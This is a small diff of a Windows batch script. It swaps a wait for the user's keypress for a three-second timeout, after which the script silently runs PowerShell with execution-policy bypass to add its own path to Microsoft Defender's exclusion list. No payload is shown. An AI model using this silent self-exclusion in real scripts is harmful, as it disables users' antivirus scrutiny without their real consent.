@@ -40,7 +40,7 @@ echo Or add This Script to Exclusion List.
 ECHO =============================================================================================  
 echo Please Press ENTER KEY to Continue!  
 ECHO =============================================================================================  
-Pause>nul 
+timeout /t 3 
 for %%i in ("%~0.") do SET "CurrentScriptPath=%%~fi" 
 echo Currently Running From  %CurrentScriptPath% 
 powershell -NoProfile -ExecutionPolicy Bypass -c "Add-MpPreference -ExclusionPath '%CurrentScriptPath%'">nul 2>&1 
